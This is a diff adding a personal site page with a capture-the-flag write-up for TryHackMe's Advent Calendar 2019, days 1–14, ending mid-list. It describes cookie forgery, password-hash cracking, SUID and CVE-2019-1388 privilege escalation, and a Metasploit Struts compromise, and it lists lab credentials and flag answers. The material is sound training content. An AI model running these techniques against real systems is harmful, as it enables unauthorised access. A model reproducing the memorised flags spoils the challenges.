@@ -1,0 +1,2185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Advent Calendar 2019 · THM Writeups</title>
+  
+  <meta name="description" content="Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>Advent Calendar 2019</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">AdventCalendar2019/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">cookie</span>
+          
+          <span class="tag-pill">base64</span>
+          
+          <span class="tag-pill">dirsearch</span>
+          
+          <span class="tag-pill">telnet</span>
+          
+          <span class="tag-pill">wireshark</span>
+          
+          <span class="tag-pill">hashcat</span>
+          
+          <span class="tag-pill">grep</span>
+          
+          <span class="tag-pill">find</span>
+          
+          <span class="tag-pill">regex</span>
+          
+          <span class="tag-pill">dataexfiltration</span>
+          
+          <span class="tag-pill">dns</span>
+          
+          <span class="tag-pill">steghide</span>
+          
+          <span class="tag-pill">fcrackzip</span>
+          
+          <span class="tag-pill">nmap</span>
+          
+          <span class="tag-pill">suid</span>
+          
+          <span class="tag-pill">privilegeescalation</span>
+          
+          <span class="tag-pill">metasploit</span>
+          
+          <span class="tag-pill">ftp</span>
+          
+          <span class="tag-pill">nfs</span>
+          
+          <span class="tag-pill">mysql</span>
+          
+          <span class="tag-pill">crypto</span>
+          
+          <span class="tag-pill">gpg</span>
+          
+          <span class="tag-pill">encryption</span>
+          
+          <span class="tag-pill">openssl</span>
+          
+          <span class="tag-pill">aws</span>
+          
+          <span class="tag-pill">buckets</span>
+          
+          <span class="tag-pill">lfi</span>
+          
+          <span class="tag-pill">urlencoding</span>
+          
+          <span class="tag-pill">hydra</span>
+          
+          <span class="tag-pill">xss</span>
+          
+          <span class="tag-pill">commandinjection</span>
+          
+          <span class="tag-pill">assembly</span>
+          
+          <span class="tag-pill">radare2</span>
+          
+          <span class="tag-pill">reverseengineering</span>
+          
+          <span class="tag-pill">sqlinjection</span>
+          
+          <span class="tag-pill">sqli</span>
+          
+          <span class="tag-pill">sqlmap</span>
+          
+          <span class="tag-pill">reverseshell</span>
+          
+          <span class="tag-pill">python</span>
+          
+        
+        
+        <span class="writeup-meta-desc">Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="advent-calendar-2019"><a href="https://tryhackme.com/room/25daysofchristmas">Advent Calendar 2019</a></h1>
+
+<h2 id="day-1-inventory-management">[Day 1] Inventory Management</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit?usp=sharing">Get Help</a></li>
+</ul>
+
+<ol>
+  <li>What is the name of the cookie used for authentication?</li>
+</ol>
+
+<p>Registered an account and checked the network tab in the developer tools.</p>
+
+<p>A: authid</p>
+
+<ol>
+  <li>If you decode the cookie, what is the value of the fixed part of the cookie?</li>
+</ol>
+
+<ul>
+  <li>Decoded from base64</li>
+</ul>
+
+<p>A: v4er9ll1!ss</p>
+
+<ol>
+  <li>After accessing his account, what did the user mcinventory request?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2019/cookiee.png" alt="" /></p>
+
+<ul>
+  <li>The first part of the cookie was the username, so I changed the value to mcinventory then encoded it to base64. Changed the cookie on the webpage and refresed the page. On deleted entries we get our answer:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/day1.png" alt="" /></p>
+
+<p>A: firewall</p>
+
+<h2 id="day2-arctic-forum">[Day2] Arctic Forum</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1622ejYtCmLOS0zd16CyfhA1xgQk8l55gYWMY8fnpHfQ/edit">Get Help</a></li>
+</ul>
+
+<ol>
+  <li>What is the path of the hidden page?</li>
+</ol>
+
+<ul>
+  <li>Tried Gobuster and dirsearch and found the answer</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/dirsearchandgobuster.png" alt="" /></p>
+
+<p>A: /sysadmin</p>
+
+<ol>
+  <li>What is the password you found?</li>
+</ol>
+
+<ul>
+  <li>Opened the page source and saw a name of a github repo</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/password.png" alt="" /></p>
+
+<ul>
+  <li>Found some credentials:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/gitt.png" alt="" /></p>
+
+<p>A: defaultpass</p>
+
+<ol>
+  <li>What do you have to take to the ‘partay’</li>
+</ol>
+
+<ul>
+  <li>Logged in and found the flag:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/flag2.png" alt="" /></p>
+
+<p>A: Eggnog</p>
+
+<h2 id="day3-evil-elf">[Day3] Evil Elf</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1ZVsOtW7mM-4neZZ4QtYCEp__exiMrvlUCXTxhB-zyxk/edit?usp=sharing">Get Help</a></li>
+</ul>
+
+<ol>
+  <li>Whats the destination IP on packet number 998?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2019/wire1.png" alt="" /></p>
+
+<p>A: 63.32.89.195</p>
+
+<ol>
+  <li>What item is on the Christmas list?</li>
+</ol>
+
+<ul>
+  <li>Sorted the packets after the Protocol and checked out the TELNET ones, as we know they send data in plain text. We found the answer:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/telnett.png" alt="" /></p>
+
+<p>A: ps4</p>
+
+<ol>
+  <li>Crack buddy’s password!</li>
+</ol>
+
+<ul>
+  <li>Alternatively, we can use the option “Follow TCP Stream” on the first TELNET package or just use strings on the pcap file:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/alternative.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Firstly, in the <em>/etc/shadow</em> file the account details have the following format: <code class="language-plaintext highlighter-rouge">username:$hash_algo$hash_salt$hash_data:other_data</code></p>
+  </li>
+  <li>
+    <p>Figure out it is an sha512 hash and so I used hashcat with hash-mode 1800 to crack it using rockyou.txt as a wordlist:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/hashcatcrack.png" alt="" /></p>
+
+<p>A: rainbow</p>
+
+<h2 id="day4-training">[Day4] Training</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/1CpwM_MdHgRqlPSe4eCC_-rVgi8F1xh88PKOySTRSkxU/edit?usp=sharing">Docs to help</a></p>
+  </li>
+  <li>
+    <p>File system:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/linuxsystem.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Format of <em>/etc/passwd</em>:</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">username:x(represent their password):userid:groupid:useridinfo:folder/location:/shell/location</code>
+        <ol>
+          <li>How many visible files are there in the home directory(excluding ./ and ../)?</li>
+        </ol>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/filesss.png" alt="" /></p>
+
+<p>A: 8</p>
+
+<ol>
+  <li>What is the content of file5?</li>
+</ol>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cat file5</code></li>
+</ul>
+
+<p>A: recipes</p>
+
+<ol>
+  <li>Which file contains the string ‘password’?</li>
+</ol>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">grep -iRl password</code></li>
+</ul>
+
+<p>A: file6</p>
+
+<ol>
+  <li>What is the IP address in a file in the home folder?</li>
+</ol>
+
+<ul>
+  <li>Used this command to check for an IP address recursively with the help of some <em>regex</em>: <code class="language-plaintext highlighter-rouge">grep -ER "([0-9]{1,3}[\.]){3}[0-9]{1,3}"</code></li>
+</ul>
+
+<p>A: 10.0.0.05</p>
+
+<ol>
+  <li>How many users can log into the machine?</li>
+</ol>
+
+<ul>
+  <li>Go into /home directory and do an <code class="language-plaintext highlighter-rouge">ls</code>. Don’t forget <em>root</em>!</li>
+</ul>
+
+<p>A: 3</p>
+
+<ol>
+  <li>What is the sha1 hash of file8?</li>
+</ol>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sha1sum file8</code></li>
+</ul>
+
+<p>A: fa67ee594358d83becdd2cb6c466b25320fd2835</p>
+
+<ol>
+  <li>What is mcsysadmin’s password hash?</li>
+</ol>
+
+<ul>
+  <li>Tried to access /etc/shadow but we don’t have the right privileges. Scanned the given doc once again and tried to search for backups with the find command. Found one of shadows and then just cat it:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/backupss.png" alt="" /></p>
+
+<p>A: $6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/</p>
+
+<h2 id="day5-ho-ho-hosint">[Day5] Ho-Ho-Hosint</h2>
+
+<ul>
+  <li><a href="https://blog.tryhackme.com/ho-ho/">Help Doc</a></li>
+</ul>
+
+<ol>
+  <li>What is Lola’s date of birth? Format: Month Date, Year(e.g November 12, 2019)</li>
+</ol>
+
+<ul>
+  <li>Ran exiftool and found a creator name. Tried foremost, binwalk, strings but nothing popped up. Checked the hint and then I searched twitter for the creator name and I found the birth date.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/twitter1.png" alt="" /></p>
+
+<p>A: December 29, 1900</p>
+
+<ol>
+  <li>What is Lola’s current occupation?</li>
+</ol>
+
+<ul>
+  <li>From her bio, we can see she is working for Santa</li>
+</ul>
+
+<p>A: Santa’s helper</p>
+
+<ol>
+  <li>What phone does Lola make?</li>
+</ol>
+
+<ul>
+  <li>From her only tweet, we can deduct it is an Iphone X</li>
+</ul>
+
+<p>A: Iphone X</p>
+
+<ol>
+  <li>What date did Lola first start her photography? Format: dd/mm/yyyy</li>
+</ol>
+
+<ul>
+  <li>Searched on the Wayback Machine website and see the first snapshot of the website is from 23th of OCtober 2019. Entered the website and read in the title when she started photographing</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/lola.png" alt="" /></p>
+
+<p>A: 23/10/2014</p>
+
+<ol>
+  <li>What famous woman does Lola have on her web page?</li>
+</ol>
+
+<ul>
+  <li>Used Google’s reverse Image Searching engine</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/ada.png" alt="" /></p>
+
+<p>A: Ada Lovelace</p>
+
+<h2 id="day6-data-elf-iltration">[Day6] Data Elf-iltration</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit?usp=sharing">Help Doc</a></p>
+  </li>
+  <li>
+    <p><strong>Data Exfiltration</strong> is the technique of transferring unauthorized data out of the network</p>
+  </li>
+  <li>
+    <p><em>Techniques</em>:</p>
+
+    <ul>
+      <li>DNS -&gt; most common</li>
+      <li>FTP/SFTP based file transfer</li>
+      <li>SMB based file transfer</li>
+      <li>HTPP/HTTPS</li>
+      <li>Steganography</li>
+      <li>ICMP</li>
+    </ul>
+  </li>
+</ul>
+
+<p>-</p>
+<ol>
+  <li>What data was exfiltrated via DNS?</li>
+</ol>
+
+<ul>
+  <li>Copied the subdomain hex value of website holidaythief.com and used an onlive converted to ascii to get the answer.</li>
+</ul>
+
+<p>A: Candy Cane Serial Number 8491</p>
+
+<ol>
+  <li>What did Little Timmy want to be for Christmas?</li>
+</ol>
+
+<ul>
+  <li>Used fcrackzip with rockyou on the zip file I got from exporting objects in Wireshark. Eventually it found that the pw to unzip the file was ‘december’. Using this, I got some gift lists.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/fcrackzippp.png" alt="" /></p>
+
+<p>A: pentester</p>
+
+<ol>
+  <li>What was hidden within the file?</li>
+</ol>
+
+<ul>
+  <li>Used steghide to extract the file from the picture I got from exporting objects in Wireshark and it revealed a poem abouc RFC527</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/steggg.png" alt="" /></p>
+
+<p>A: RFC527</p>
+
+<h2 id="day7-skilling-up">[Day7] Skilling Up</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1q0FziVZM3zCWhcgtPpljVPzkBX0fMAh6ebrXVM5rg08/edit?usp=sharing">Help Doc</a></li>
+</ul>
+
+<ol>
+  <li>How many TCP ports under 1000 are open?</li>
+</ol>
+
+<ul>
+  <li>Simple Nmap scan revealed there are only 3 TCP ports open</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/nmapchrist.png" alt="" /></p>
+
+<p>A: 3</p>
+
+<ol>
+  <li>What is the name of the OS of the host?</li>
+</ol>
+
+<ul>
+  <li>Had to use aggresive os scan option in order to get a reliable answer from Nmap:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/osscan.png" alt="" /></p>
+
+<p>A: Linux</p>
+
+<ol>
+  <li>What version of SSH is running?</li>
+</ol>
+
+<ul>
+  <li>Use the <code class="language-plaintext highlighter-rouge">-sV</code> flag:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/sshscan.png" alt="" /></p>
+
+<p>A: 7.4</p>
+
+<ol>
+  <li>What is the name of the file that is accessible on the server you found running?</li>
+</ol>
+
+<ul>
+  <li>From the scan we can see there is an http server running on port 999. We access that and we get one file we can download:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/interestingfile.png" alt="" /></p>
+
+<p>A: interesting.file</p>
+
+<h2 id="day8-suid-shenanigans">[Day8] SUID Shenanigans</h2>
+
+<ul>
+  <li>
+    <p><a href="https://blog.tryhackme.com/linux-privilege-escalation-suid/">Help Doc</a></p>
+  </li>
+  <li>
+    <p>Deploy and SSH into the machine.</p>
+
+    <ul>
+      <li>Username: holly</li>
+      <li>Password: tuD@4vt0G*TU</li>
+    </ul>
+  </li>
+  <li>
+    <p>Sometimes, we need to have root privileges in order to execute some important commands</p>
+
+    <ul>
+      <li>
+        <p>one example of this is changing our password</p>
+
+        <ul>
+          <li>because we need to be able to do this, we need to have executing privileges on the file /etc/passwd in order to successfully change our password.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>In essence, SUID files execute with the permission of the <strong>file owner</strong>.</p>
+  </li>
+</ul>
+
+<ol>
+  <li>What port is SSH running on?</li>
+</ol>
+
+<ul>
+  <li>An nmap scan on all ports revealed on which port ssh is running</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/sshscannew.png" alt="" /></p>
+
+<p>A: 65534</p>
+
+<ol>
+  <li>Find and run a file as igor. Read the file /home/igor/flag1.txt</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Search for all SUIDs which I can use as igor.</p>
+  </li>
+  <li>
+    <p>Found that find was one of the commands so I ran it as igor and used <code class="language-plaintext highlighter-rouge">-exec cat {} \;</code> to get the contents of flag1.txt</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/findsuid.png" alt="" /></p>
+
+<p>A: THM{d3f0708bdd9accda7f937d013eaf2cd8}</p>
+
+<ol>
+  <li>Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?</li>
+</ol>
+
+<ul>
+  <li>Search the binaries with a SUID by root. After I tried a couple, I searched the website <a href="https://gtfobins.github.io/#+suid">GTFObins</a> for some inspiration but I could not figure out anything. Finally, I observed a binary called system-control. It seems like it executes any command we give it so I used it to become root and cat the flag2.txt file.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/privesc.png" alt="" /></p>
+
+<p>A: THM{8c8211826239d849fa8d6df03749c3a2}</p>
+
+<h2 id="day9-requests">[Day9] Requests</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit?usp=sharing">Help Doc</a></li>
+</ul>
+
+<ol>
+  <li>What is the value of the flag?</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">'http://10.10.169.100:3000'</span>
+<span class="n">path</span> <span class="o">=</span> <span class="s">'/'</span>
+<span class="n">answer</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">while</span> <span class="n">path</span> <span class="o">!=</span> <span class="s">'/end'</span><span class="p">:</span>
+	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="n">path</span><span class="p">)</span>
+	<span class="n">reponse_in_json_format</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+	<span class="n">path</span> <span class="o">=</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">reponse_in_json_format</span><span class="p">[</span><span class="s">'next'</span><span class="p">]</span> <span class="c1"># get next letter
+</span>	<span class="k">if</span> <span class="n">path</span> <span class="o">!=</span> <span class="s">'/end'</span><span class="p">:</span>
+		<span class="n">answer</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">reponse_in_json_format</span><span class="p">[</span><span class="s">'value'</span><span class="p">])</span> <span class="c1"># update flag	
+</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">answer</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>A: sCrIPtKiDdend</p>
+
+<h2 id="day10-metasploit-a-ho-ho-ho">[Day10] Metasploit-a-ho-ho-ho</h2>
+
+<ul>
+  <li>
+    <p><a href="https://tryhackme.com/resources/blog/metasploit">Help Doc</a></p>
+  </li>
+  <li>
+    <p>Steps:</p>
+
+    <ul>
+      <li>select a module</li>
+      <li>set the correct payload</li>
+      <li>set our options</li>
+      <li>ran the payload</li>
+    </ul>
+  </li>
+  <li>
+    <p>I used nmap to get an idea of the ip address and from that we found port 80 is open. Searched the source for something useful and found this js file:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/struts.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Inside, some clues indicate the version 2.0 of Struts.</p>
+  </li>
+  <li>
+    <p>Searched for a proper exploit on Metasploit and decided to use the same as the one used on the blog post. Set all of the required parameters and chose the same payload as in the blog. Type exploit and got a meterpreter:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/metsaploit.png" alt="" /></p>
+
+<ol>
+  <li>Compromise the web server using Metasploit. What is flag1?</li>
+</ol>
+
+<ul>
+  <li>Ran shell on the meterpreter to get a shell and then I used find to get to the first flag file: <code class="language-plaintext highlighter-rouge">file \ 2&gt;\dev\null | grep "flag1"</code></li>
+</ul>
+
+<p>A: THM{3ad96bb13ec963a5ca4cb99302b37e12}</p>
+
+<ol>
+  <li>Now you’ve compromised the web server, get onto the main system. What is Santa’s SSH password?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Moved to <code class="language-plaintext highlighter-rouge">/home</code> and found there is one directory <code class="language-plaintext highlighter-rouge">santa</code> that contained some ssh credentials that I used then to log into the tomcat server as santa.</p>
+
+    <p>-<code class="language-plaintext highlighter-rouge">santa:rudolphrednosedreindeer</code></p>
+  </li>
+</ul>
+
+<p>A: rudolphrednosedreindeer</p>
+
+<ol>
+  <li>Who is on line 148 of the naughty list?</li>
+</ol>
+
+<ul>
+  <li>Used command <code class="language-plaintext highlighter-rouge">cat naughty_list.txt | head -n148 | tail -n1</code></li>
+</ul>
+
+<p>A: Melisa Vanhoose</p>
+
+<ol>
+  <li>Who is on line 52 of the nice list?</li>
+</ol>
+
+<ul>
+  <li>Used command <code class="language-plaintext highlighter-rouge">cat nice_list.txt | head -n 52 | tail -n1</code></li>
+</ul>
+
+<p>A: Lindsey Gaffney</p>
+
+<h2 id="day11-elf-applications">[Day11] Elf Applications</h2>
+
+<ul>
+  <li><a href="https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#">Help Doc</a></li>
+</ul>
+
+<h3 id="ftp">FTP</h3>
+
+<ul>
+  <li>
+    <p>uses a client-server model to communicate</p>
+  </li>
+  <li>
+    <p>Most FTP servers allow <em>anonymous login</em>:</p>
+
+    <ul>
+      <li>user: anonymous</li>
+      <li>pw: anonymous</li>
+    </ul>
+  </li>
+  <li>
+    <p>Old and often vulnerable protocol that is still used today</p>
+  </li>
+  <li>
+    <p>runs on <em>port 21</em></p>
+  </li>
+  <li>
+    <p>connect to a FTP server: <code class="language-plaintext highlighter-rouge">ftp &lt;IP_Address&gt;</code></p>
+  </li>
+</ul>
+
+<h3 id="nfs-network-file-share">NFS (Network File Share)</h3>
+
+<ul>
+  <li>
+    <p>runs on both TCP and UDP on ports 111 and 2049</p>
+  </li>
+  <li>
+    <p>acts as a distributed system</p>
+  </li>
+  <li>
+    <p>uses linux permission system to manage autehntication authorization to files</p>
+  </li>
+  <li>
+    <p>check if any shares are available: <code class="language-plaintext highlighter-rouge">showmount -e &lt;ip-address&gt;</code></p>
+
+    <ul>
+      <li>
+        <p>if this outputs any shares, you can mount it (need to have sudo permission) to your file system: <code class="language-plaintext highlighter-rouge">mount ip:/file/path /local/file/path</code></p>
+      </li>
+      <li>
+        <p>unmount: <code class="language-plaintext highlighter-rouge">unmount /local/file/path</code></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="mysql">MySQL</h3>
+
+<ul>
+  <li>uses TCP and runs on <em>port 3306</em> by default</li>
+</ul>
+
+<ol>
+  <li>What is the password inside the creds.txt file?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2019/mounttt.png" alt="" /></p>
+
+<p>A: securepassword123</p>
+
+<ol>
+  <li>What is the name of the file running on port 21?</li>
+</ol>
+
+<ul>
+  <li>logged in using the default credentials and downloaded the file to get some credentials?</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/ftpget.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2019/sshcreds.png" alt="" /></p>
+
+<p>A: file.txt</p>
+
+<ol>
+  <li>What is the password after enumerating the database?</li>
+</ol>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">mysql -h 10.10.63.35 -u root -p ff912ABD*</code></p>
+  </li>
+  <li>
+    <p>Once in: <code class="language-plaintext highlighter-rouge">show databases;</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">use data;</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">SELECT * FROM USERS;</code></p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/sqlconnect.png" alt="" /></p>
+
+<p>A: bestpassword</p>
+
+<h2 id="day12-elfcryption">[Day12] Elfcryption</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/1xUOtEZOTS_L8u_S5Fbs1Wof7mdpWQrj2NkgWLV9tqns/edit?usp=sharing">Help Doc</a></p>
+  </li>
+  <li>
+    <p>How to generate private/public keys pair and use them to encrypt/decrypt a files:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/generatingprivatepublickeys.png" alt="" /></p>
+
+<ol>
+  <li>What is the md5 hashsum of the encrypted note1 file?</li>
+</ol>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">md5sum note1.txt.gpg</code></li>
+</ul>
+
+<p>A: 24cf615e2a4f42718f2ff36b35614f8f</p>
+
+<ol>
+  <li>Where was elf Bob told to meet Alice?</li>
+</ol>
+
+<ul>
+  <li>Used the hint to get the gpg passphrase:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/bobalice.png" alt="" /></p>
+
+<p>A: Santa’s Grotto</p>
+
+<ol>
+  <li>Decrypt note2 and obtain the flag!</li>
+</ol>
+
+<ul>
+  <li>Decrypt the note2 file using the private key and using the passphrase given in the hint:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/privatekeydecrypt.png" alt="" /></p>
+
+<p>A: THM{ed9ccb6802c5d0f905ea747a310bba23}</p>
+
+<h2 id="day13-accumulate">[Day13] Accumulate</h2>
+
+<ul>
+  <li>
+    <p>Here’s the general way to attempt exploitation when just given an IP address:</p>
+
+    <ul>
+      <li>
+        <p>start out with an NMAP scan to see what services are running</p>
+      </li>
+      <li>
+        <p>enumerate these services and try exploit them</p>
+      </li>
+      <li>
+        <p>use these exploited services to get an initial access to the host machine</p>
+      </li>
+      <li>
+        <p>enumerate the host machine to elevate privileges</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Enumeration:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/nmappppp.png" alt="" /></p>
+
+<ol>
+  <li>A web server is running on the target. What is the hidden directory which the website lives on?</li>
+</ol>
+
+<ul>
+  <li>Used gobuster and found one directory: /retro</li>
+</ul>
+
+<p>A: /retro</p>
+
+<ol>
+  <li>Gain initial access and read the contents of user.txt</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Used <code class="language-plaintext highlighter-rouge">wpscan --url 10.10.195.52/retro</code></p>
+  </li>
+  <li>
+    <p>Found the version of wp: 5.2.1</p>
+  </li>
+  <li>
+    <p>Used this url http://10.10.195.52/retro/index.php/comments/feed/ to get to the comment in which Wade tells his password: parzival</p>
+
+    <ul>
+      <li>use username wade and that to log into his account</li>
+    </ul>
+  </li>
+  <li>
+    <p>Used Remmina RDP to connect to the machine using the credentials stolen</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/remminaaa.png" alt="" /></p>
+
+<p>A: THM{HACK_PLAYER_ONE}</p>
+
+<ol>
+  <li>[Optional] Elevate privileges and read the content of root.txt</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Browse history and find pages on <em>CVE-2019-1388</em></p>
+  </li>
+  <li>
+    <p>How to PrivEsc:</p>
+  </li>
+</ul>
+
+<p>1) find a program that can trigger the UAC prompt screen</p>
+
+<p>2) select “Show more details”</p>
+
+<p>3) select “Show information about the publisher’s certificate”</p>
+
+<p>4) click on the “Issued by” URL link it will prompt a browser interface.</p>
+
+<p>5) wait for the site to be fully loaded &amp; select “save as” to prompt a explorer window for “save as”.</p>
+
+<p>6) on the explorer window address path, enter the cmd.exe full path:
+C:\WINDOWS\system32\cmd.exe</p>
+
+<p>7) now you’ll have an escalated privileges command prompt.</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=RW5l6dQ8H-8">In Action</a></li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/privvvv.png" alt="" /></p>
+
+<p>A: THM{COIN_OPERATED_EXPLOITATION}</p>
+
+<h2 id="day14-unknown-storage">[Day14] Unknown Storage</h2>
+
+<ul>
+  <li>
+    <p><a href="https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#">Help Doc</a></p>
+  </li>
+  <li>
+    <p>AWS provides the ability for clients to store a lot of data using a service called <strong>Simple Storage Service(S3)</strong></p>
+  </li>
+  <li>The first part of <em>enumerating</em> s3 buckets is having an s3 bucket name. How would you find an s3 bucket name:
+    <ul>
+      <li>Source code on git repositories 
+ 	- Analysing requests on web pages
+        <ul>
+          <li>Some pages retrieve static resources from s3 buckets</li>
+        </ul>
+      </li>
